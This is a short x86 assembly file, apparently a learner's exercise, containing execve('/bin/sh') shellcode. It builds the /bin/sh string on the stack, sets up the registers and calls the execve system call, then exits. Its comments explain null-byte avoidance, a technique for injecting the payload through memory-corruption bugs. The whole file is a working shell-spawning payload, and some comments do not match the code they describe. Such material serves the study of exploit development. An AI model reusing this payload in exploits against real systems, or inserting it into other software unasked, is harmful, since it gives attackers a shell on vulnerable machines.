global _start

section .text

_start:

	xor eax, eax
	push eax
	mov ebp, esp
	push 0x68732f
	;push 0x6e69622f
	push 0x6e69622f    ;since I want to push /bin/sh but it don't have the length in multiple of 4, so instead of pushing 0x69622f push them byte wise otherwise you
		     ;will get a null byte also. Remember that you can push a byte or 4bytes collectively to avoid null byte, and in other cases you will get a null byte
		     ;or you can also push /bin//sh to make it the multiple of 4 length and push 4 bytes collectively. It will have no effect on working
	;push byte 0x62
	;push byte 0x2f
	

	
	xor ebx, ebx	
	mov ebx, esp	;ebx has the /bin/sh terminated by null character

	push eax	;for terminating the array for ecx with null characters	
	push ebx	;the address of array where the /bin//sh string present, because ecx is a pointer array, pointing to the address where /bin//sh is present
			;now ecx will have the address of stack where the address of /bin//sh string is present
	xor ecx, ecx
	mov ecx, esp	;ecx has the address of /bin/sh terminated by null characters. Infact ebx do have the same bcz the working of registers with stack is done using address
	
	mov edx, ebp	;simply nulls will come in edx with the help of direct address
	
	mov al, 11
	int 0x80
	

	xor eax, eax
	mov al, 1
	int 0x80
	
